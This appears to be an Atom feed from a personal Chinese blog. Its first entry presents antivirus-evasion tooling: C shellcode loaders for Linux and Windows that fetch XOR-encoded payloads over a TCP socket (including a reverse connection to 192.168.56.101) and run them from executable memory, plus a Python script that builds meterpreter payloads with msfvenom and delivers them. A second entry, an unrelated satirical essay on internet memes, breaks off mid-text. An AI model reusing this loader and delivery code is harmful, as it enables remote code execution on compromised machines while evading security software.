<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xXxYOLOxXx</title>
  
  <subtitle>xXxYOLOxXx</subtitle>
  <link href="https://yoloyolo.top/atom.xml" rel="self"/>
  
  <link href="https://yoloyolo.top/"/>
  <updated>2024-01-16T11:50:52.594Z</updated>
  <id>https://yoloyolo.top/</id>
  
  <author>
    <name>xXxYOLOxXx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Shellcode_Loader</title>
    <link href="https://yoloyolo.top/2023/11/02/Shellcode-Loader/"/>
    <id>https://yoloyolo.top/2023/11/02/Shellcode-Loader/</id>
    <published>2023-11-02T12:01:23.000Z</published>
    <updated>2024-01-16T11:50:52.594Z</updated>
    
    <content type="html"><![CDATA[<p>分离免杀，把ShellCode的加载部分与运行部分分开，再通过TCP Socket传输运行部分给到Loader程序,从而实现Shellcode直接在内存中运行</p><a id="more"></a><p>闲着上网冲浪偶然看到了这个免杀方法，适用于WebShell或者RCE漏洞，但网上找到的不是特别全<br />这里按照系统与正反向连接方法的不同写了四份代码，并额外添加了Shellcode异或以避免被检测到直接传输Shelllcode<br />顺手写了个meterpreter payload生成并自动传输的脚本<br />本想开个repo的，但是感觉这玩意后续也没啥可更新的了，直接丢blog里算了</p><h1 id="linux_bind"><a class="markdownIt-Anchor" href="#linux_bind"></a> Linux_Bind</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">const char *port &#x3D; &quot;1338&quot;;</span><br><span class="line">const int key &#x3D; 0xff;</span><br><span class="line">int listenSocket, clientSocket;</span><br><span class="line">int recvBytes &#x3D; 0;</span><br><span class="line">struct sockaddr_in serverAddr, clientAddr;</span><br><span class="line"></span><br><span class="line">socklen_t clientAddrLen &#x3D; sizeof(clientAddr);</span><br><span class="line">serverAddr.sin_family &#x3D; AF_INET;</span><br><span class="line">serverAddr.sin_addr.s_addr &#x3D; INADDR_ANY;</span><br><span class="line">serverAddr.sin_port &#x3D; htons(atoi(port));</span><br><span class="line">listenSocket &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">bind(listenSocket, (struct sockaddr *)&amp;serverAddr, sizeof(serverAddr));</span><br><span class="line">listen(listenSocket, SOMAXCONN);</span><br><span class="line">clientSocket &#x3D; accept(listenSocket, (struct sockaddr *)&amp;clientAddr, &amp;clientAddrLen);</span><br><span class="line">recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">&#123;</span><br><span class="line">bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">&#125;</span><br><span class="line">void *shellcode &#x3D; mmap(NULL, recvBytes, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));</span><br><span class="line">((void(*)()) shellcode)();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="linux_reverse"><a class="markdownIt-Anchor" href="#linux_reverse"></a> Linux_Reverse</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">const char* port &#x3D; &quot;1338&quot;;</span><br><span class="line">const char* serverAddress &#x3D; &quot;192.168.56.101&quot;;</span><br><span class="line">const int key &#x3D; 0xff;</span><br><span class="line">int clientSocket;</span><br><span class="line">int recvBytes &#x3D; 0;</span><br><span class="line">struct sockaddr_in serverAddr;</span><br><span class="line"></span><br><span class="line">socklen_t serverAddrLen &#x3D; sizeof(serverAddr);</span><br><span class="line">clientSocket &#x3D; socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">serverAddr.sin_family &#x3D; AF_INET;</span><br><span class="line">serverAddr.sin_port &#x3D; htons(atoi(port));</span><br><span class="line">inet_pton(AF_INET, serverAddress, &amp;serverAddr.sin_addr);</span><br><span class="line">connect(clientSocket, (struct sockaddr*)&amp;serverAddr, serverAddrLen);</span><br><span class="line">recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">&#123;</span><br><span class="line">bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">&#125;</span><br><span class="line">void *shellcode &#x3D; mmap(NULL, recvBytes, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">memcpy(shellcode, bufferReceivedBytes, sizeof(bufferReceivedBytes));</span><br><span class="line">((void(*)()) shellcode)();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="windows_bind"><a class="markdownIt-Anchor" href="#windows_bind"></a> Windows_Bind</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#include &lt;WS2tcpip.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">CHAR bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">INT recvBytes &#x3D; 0;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">PCSTR port &#x3D; &quot;1338&quot;;</span><br><span class="line">const int key &#x3D; 0xff;</span><br><span class="line">SOCKET clientSocket &#x3D; INVALID_SOCKET;</span><br><span class="line">SOCKET listenSocket &#x3D; INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">ADDRINFOA SocketHint &#x3D; &#123;0&#125;;</span><br><span class="line">ADDRINFOA* AddrInfo &#x3D; NULL;</span><br><span class="line">SocketHint.ai_family &#x3D; AF_INET;</span><br><span class="line">SocketHint.ai_socktype &#x3D; SOCK_STREAM;</span><br><span class="line">SocketHint.ai_protocol &#x3D; IPPROTO_TCP;</span><br><span class="line">SocketHint.ai_flags &#x3D; AI_PASSIVE;</span><br><span class="line">WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</span><br><span class="line">GetAddrInfoA(NULL, port, &amp;SocketHint, &amp;AddrInfo);</span><br><span class="line">listenSocket &#x3D; socket(AddrInfo-&gt;ai_family, AddrInfo-&gt;ai_socktype, AddrInfo-&gt;ai_protocol);</span><br><span class="line">bind(listenSocket, AddrInfo-&gt;ai_addr, (int)AddrInfo-&gt;ai_addrlen);</span><br><span class="line">listen(listenSocket, SOMAXCONN);</span><br><span class="line">clientSocket &#x3D; accept(listenSocket, NULL, NULL);</span><br><span class="line">recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">&#123;</span><br><span class="line">bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID shellcode &#x3D; VirtualAlloc(NULL, recvBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">memcpy(shellcode, bufferReceivedBytes, recvBytes);</span><br><span class="line">((void(*)()) shellcode)();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="windows_reverse"><a class="markdownIt-Anchor" href="#windows_reverse"></a> Windows_Reverse</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;WinSock2.h&gt;</span><br><span class="line">#include &lt;WS2tcpip.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">CHAR bufferReceivedBytes[4096] &#x3D; &#123;0&#125;;</span><br><span class="line">INT recvBytes &#x3D; 0;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">PCSTR port &#x3D; &quot;1338&quot;;</span><br><span class="line">const int key &#x3D; 0xff;</span><br><span class="line">SOCKET clientSocket &#x3D; INVALID_SOCKET;</span><br><span class="line">SOCKET listenSocket &#x3D; INVALID_SOCKET;</span><br><span class="line"></span><br><span class="line">ADDRINFOA SocketHint &#x3D; &#123;0&#125;;</span><br><span class="line">ADDRINFOA* AddrInfo &#x3D; NULL;</span><br><span class="line">SocketHint.ai_family &#x3D; AF_INET;</span><br><span class="line">SocketHint.ai_socktype &#x3D; SOCK_STREAM;</span><br><span class="line">SocketHint.ai_protocol &#x3D; IPPROTO_TCP;</span><br><span class="line">SocketHint.ai_flags &#x3D; AI_PASSIVE;</span><br><span class="line">WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</span><br><span class="line">GetAddrInfoA(NULL, port, &amp;SocketHint, &amp;AddrInfo);</span><br><span class="line">listenSocket &#x3D; socket(AddrInfo-&gt;ai_family, AddrInfo-&gt;ai_socktype, AddrInfo-&gt;ai_protocol);</span><br><span class="line">bind(listenSocket, AddrInfo-&gt;ai_addr, (int)AddrInfo-&gt;ai_addrlen);</span><br><span class="line">listen(listenSocket, SOMAXCONN);</span><br><span class="line">clientSocket &#x3D; accept(listenSocket, NULL, NULL);</span><br><span class="line">recvBytes &#x3D; recv(clientSocket, bufferReceivedBytes, sizeof(bufferReceivedBytes), 0);</span><br><span class="line">for(int i &#x3D; 0; i &lt;&#x3D; recvBytes; i++)</span><br><span class="line">&#123;</span><br><span class="line">bufferReceivedBytes[i] &#x3D; bufferReceivedBytes[i] ^ key;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID shellcode &#x3D; VirtualAlloc(NULL, recvBytes, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">memcpy(shellcode, bufferReceivedBytes, recvBytes);</span><br><span class="line">((void(*)()) shellcode)();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shellcode_transferer"><a class="markdownIt-Anchor" href="#shellcode_transferer"></a> Shellcode_transferer</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import click</span><br><span class="line">import socket</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">@click.command()</span><br><span class="line">@click.option(&quot;-a&quot;, default&#x3D;None, type&#x3D;click.Choice([&quot;x86&quot;]), help&#x3D;&quot;Architecture (default: x64)&quot;)</span><br><span class="line">@click.option(&quot;-pl&quot;, required&#x3D;True, type&#x3D;click.Choice([&quot;windows&quot;, &quot;linux&quot;]), help&#x3D;&quot;Platform (choices: windows, linux)&quot;)</span><br><span class="line">@click.option(&quot;-f&quot;, required&#x3D;True, type&#x3D;click.Choice([&quot;b&quot;, &quot;r&quot;]), help&#x3D;&quot;Flow (choices: b, r). \&quot;b\&quot; for bind_tcp and \&quot;r\&quot; for reverse_tcp&quot;)</span><br><span class="line">@click.option(&quot;-h&quot;, type&#x3D;str, required&#x3D;True, help&#x3D;&quot;Host&quot;)</span><br><span class="line">@click.option(&quot;-p&quot;, type&#x3D;int, required&#x3D;True, help&#x3D;&quot;Port&quot;)</span><br><span class="line">@click.option(&quot;-lp&quot;, type&#x3D;int, required&#x3D;True, help&#x3D;&quot;Loader port&quot;)</span><br><span class="line"></span><br><span class="line">def shellcode_start(a, pl, f, h, p, lp):</span><br><span class="line">arch &#x3D; a</span><br><span class="line">platform &#x3D; pl</span><br><span class="line">flow &#x3D; f</span><br><span class="line">host &#x3D; h</span><br><span class="line">port &#x3D; p</span><br><span class="line">loader_port &#x3D; lp</span><br><span class="line">if arch:</span><br><span class="line">if platform &#x3D;&#x3D; &quot;windows&quot;:</span><br><span class="line">if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">elif platform &#x3D;&#x3D; &quot;linux&quot;:</span><br><span class="line">if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">else:</span><br><span class="line">if platform &#x3D;&#x3D; &quot;windows&quot;:</span><br><span class="line">if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">elif platform &#x3D;&#x3D; &quot;linux&quot;:</span><br><span class="line">if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (port)</span><br><span class="line">elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">msfvenom &#x3D; &quot;msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;%s LPORT&#x3D;%d -f c -b &#39;\\x00&#39;&quot; % (host, port)</span><br><span class="line">print(msfvenom)</span><br><span class="line">result, err &#x3D; subprocess.Popen(msfvenom, stdout &#x3D; subprocess.PIPE, stderr &#x3D; subprocess.PIPE, shell &#x3D; True).communicate()</span><br><span class="line">result &#x3D; binascii.unhexlify(result.decode().split(&quot;&#x3D; \n\&quot;&quot;)[1].replace(&quot;\&quot;\n\&quot;&quot;, &quot;&quot;)[:-3].replace(&quot;\\x&quot;, &quot;&quot;).encode())</span><br><span class="line"></span><br><span class="line">key &#x3D; 0xff</span><br><span class="line">new_shellcode &#x3D; &quot;&quot;</span><br><span class="line">for _ in result:</span><br><span class="line">new_shellcode &#x3D; new_shellcode + chr(_ ^ key)</span><br><span class="line"></span><br><span class="line">if flow &#x3D;&#x3D; &quot;b&quot;:</span><br><span class="line">client_socket &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client_socket.connect((host, loader_port))</span><br><span class="line">client_socket.send(new_shellcode.encode(&quot;ISO-8859-1&quot;))</span><br><span class="line">client_socket.close()</span><br><span class="line">elif flow &#x3D;&#x3D; &quot;r&quot;:</span><br><span class="line">server_socket &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">server_socket.bind((&quot;0.0.0.0&quot;, loader_port))</span><br><span class="line">server_socket.listen(1)</span><br><span class="line">print(&quot;Socket server online.&quot;)</span><br><span class="line">client_socket, client_address &#x3D; server_socket.accept()</span><br><span class="line">client_socket.send(new_shellcode.encode(&quot;ISO-8859-1&quot;))</span><br><span class="line">client_socket.close()</span><br><span class="line">server_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    shellcode_start()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;分离免杀，把ShellCode的加载部分与运行部分分开，再通过TCP Socket传输运行部分给到Loader程序,从而实现Shellcode直接在内存中运行&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Anti_AntiVirus" scheme="https://yoloyolo.top/tags/Anti-AntiVirus/"/>
    
  </entry>
  
  <entry>
    <title>Antimemetic</title>
    <link href="https://yoloyolo.top/2023/10/18/Antimemetic/"/>
    <id>https://yoloyolo.top/2023/10/18/Antimemetic/</id>
    <published>2023-10-17T17:22:59.000Z</published>
    <updated>2024-01-26T13:29:38.658Z</updated>
    
    <content type="html"><![CDATA[<p>抽象日志：逆模因</p><a id="more"></a><h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p>丁真爆火、灵活就业、孔乙己脱不下长衫、低收入、“这个私家车，你可以拉活，那么这对于你这个解决就业问题，解决这个低收入群体的问题，我认为也是一个很有效的方式，还比如说你把那个，自己闲置的房子租出去，这也是获得收入的一种方式”、等</p><h1 id="从一句pua开始的模因"><a class="markdownIt-Anchor" href="#从一句pua开始的模因"></a> 从一句PUA开始的模因</h1><p>^.*，还不是你不够努力？$</p><p>“别人都能干，你为什么干不了，还不是你不够努力？”</p><p>“你为什么考不上好大学，还不是你不够努力？”</p><p>“你找不到工作，还不是你不够努力？”</p><p>以上为常规用法</p><p>这个句式过于好用，以至于在任何场景都能用上</p><p>究其原因，这句话把事情的失败完全归咎于个人的不够努力，而完全忽视了客观上的问题与困难</p><p>于是乎，这句话就成了模因</p><p>更确切来说，这个信息成了模因</p><h1 id="逆模因"><a class="markdownIt-Anchor" href="#逆模因"></a> 逆模因</h1><p>“逆模因”（Antimemetic）是一个相对较新的概念，通常用来描述一种与传统互联网模因（meme）相反的现象。在传统意义上，互联网模因是指在网络上传播的文化元素，如图片、视频、短语等，它们通过传播和分享在社交媒体和其他在线平台上迅速传播，引发共鸣和笑声。</p><p>逆模因则是指一种涉及反讽、颠倒或颠覆传统模因的现象。逆模因常常采用幽默或讽刺的方式，挖苦或模仿传统模因，以引起观众的注意。这种现象通常涉及改编、反转或颠覆原始模因的主题或含义。逆模因有时也可以被用来表达对传统模因的批评或反对。</p><p>需要注意的是，逆模因并不是一个固定的定义，而是一个广泛的概念，可以涉及各种不同类型的内容和表现形式。它们通常反映了网络文化中的幽默和创意，是网络模因的一种变体。逆模因的形式和内容可以因时间和地点而异，因此它们是一个动态的概念，随着互联网文化的发展而不断演变。</p><p>逆模因是一种富有创意和幽默的方式，通常涉及颠覆、模仿或反讽传统模因。以下是一些方式可以进行逆模因：</p><ol><li><p>改编模因图片或视频： 将经典的模因图片或视频进行修改，以改变其中的元素或情境，从而产生出讽刺或反转的效果。这种方式通常以幽默的形式呈现。</p></li><li><p>创造相反的情境： 将传统模因中的情境或元素反转，以创造出截然不同的效果。这可以包括将正常情境变得荒谬，或将荒谬情境变得正常。</p></li><li><p>模仿模因风格： 模仿特定模因的风格和元素，但在其中插入完全不同的内容，以制造出意想不到的效果。这种方式常常涉及对传统模因的戏仿。</p></li><li><p>批评或反对模因主题： 制作逆模因以表达对某一传统模因主题或其文化含义的批评或反对。这种方式可以用于传达讽刺或反对特定观点。</p></li><li><p>创造新的含义： 利用传统模因的图像或元素，但赋予它们全新的含义或背景，以引发观众的思考或笑声。</p></li><li><p>利用文字和字词游戏： 通过对文字和字词进行幽默性的改编或双关解读，以创造出新的含义或笑点。</p></li><li><p>社会和文化评论： 使用逆模因作为一种方式来评论社会和文化现象，或对社会和文化问题提出反思性见解。</p></li><li><p>模因融合： 将两个或多个不同的模因结合在一起，以创造出新的、混合式的模因，这常常会引发观众的兴趣和笑声。</p></li></ol><p>无论采用哪种方式，逆模因通常要依赖创意和幽默，以引发观众的共鸣和笑声。这些逆模因的受欢迎程度通常取决于它们的创新性和社会文化的背景。逆模因是网络文化中的一种创意表达形式，可以让人们重新审视并享受传统模因的不同面向。</p><h1 id="逆模因的使用"><a class="markdownIt-Anchor" href="#逆模因的使用"></a> 逆模因的使用</h1><p>有模因那自然就有逆模因</p><p>“我为什么不能拉出去五枪五个头，还不是我不够努力？”</p><p>“我为什么不能当市委书记，还不是我不够努力？”</p><p>“还不是我不能吃苦，还不是我不够努力？”</p><p>^.*，还不是我不够努力？$</p><p>将主语总&quot;你&quot;变为&quot;我&quot;，表面上看来是一种自我PUA，但实际上为套用这句式来进行反讽</p><p>转念一想，不够努力的又何尝只有我们？</p><p>“我爷爷当年怎么没有润港，还不是他不够努力？”</p><p>“县里面怎么还没修机场建大专，还不是县委书记不够努力？”</p><p>“怎么还没收复台湾，还不是他不够努力？”</p><p>^.*，还不是[^你我]+不够努力？$</p><p>于是乎，是他人不够努力的造成了你所面临的问题</p><h1 id="口号化"><a class="markdownIt-Anchor" href="#口号化"></a> 口号化</h1><p>&quot;还不是你不够努力&quot;这句话还是太长了，直接缩短为&quot;还不是&quot;更当简洁明了</p><p>将一句话缩短为几个字，制作成口号化的好处包括：</p><ol><li><p>易于记忆： 简短的口号更容易被人们记住，因为它们不会占用太多的记忆空间。</p></li><li><p>易于传播： 简洁的口号更容易在口头传播、社交媒体上分享，从而扩散思想或信息。</p></li><li><p>引人注意： 简短的口号通常更具冲击力，能够更快地引起人们的注意。</p></li><li><p>强调关键信息： 缩短后的口号通常聚焦于关键信息，增强了表达的明确性。</p></li><li><p>适应不同语境： 简短的口号适用于各种场合，无论是宣传活动、政治口号还是广告标语。</p></li></ol><p>总之，简化和缩短口号可以帮助信息更好地传达和传播，使人们更容易理解和记住核心思想。这对于宣传、广告和社交传媒等领域非常有用。</p><h1 id="番外_0"><a class="markdownIt-Anchor" href="#番外_0"></a> 番外_0</h1><p>“请列出二十一世纪二十年代中国人四大美德”</p><p>“《福报》，《慢就业》，《晚退休》，《早生育》，《先吃苦后享福》”</p><p>“卷摆润躺”</p><h1 id="番外_1"><a class="markdownIt-Anchor" href="#番外_1"></a> 番外_1</h1><p>从Ready or Not到辱华</p><p>很难想象这个游戏是怎么跟辱华沾上边的，简单了解之后归纳如下</p><p>Ready or Not使用了Bing Chilling音频作为内部测试，而未在实际删除</p><p>被发现后就有人指出这是辱华行为</p><p>开发人员表示会在下个更新中移除</p><blockquote><p><a href="https://steamcommunity.com/app/1144200/discussions/0/4287991687296625611/?l=english">https://steamcommunity.com/app/1144200/discussions/0/4287991687296625611/?l=english</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">It&#39;s getting removed in next patch.</span><br><span class="line"></span><br><span class="line">You can save the files to your computer and rename them to different voiceover lines for some characters to randomly say &quot;bing chilling&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">It was just an inside joke in the company, it&#39;s under failactivity so it was probably meant to play any time you failed a mission. They obviously removed its function but just forgot to remove the sound files too.</span><br></pre></td></tr></table></figure><p>Bing Chilling辱华吗</p><p>字面上并不辱华，需要根据实际使用场景来判断，这里先假设不辱华</p><p>那么John Cena辱华吗</p><blockquote><p><a href="https://m.huanqiu.com/article/43GCk2Tb7fp">https://m.huanqiu.com/article/43GCk2Tb7fp</a><br /><a href="https://knowyourmeme.com/memes/john-cena-speaking-chinese-and-eating-ice-cream-bing-chilling">https://knowyourmeme.com/memes/john-cena-speaking-chinese-and-eating-ice-cream-bing-chilling</a></p></blockquote><p>根据上述两个链接可以得到以下时间线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 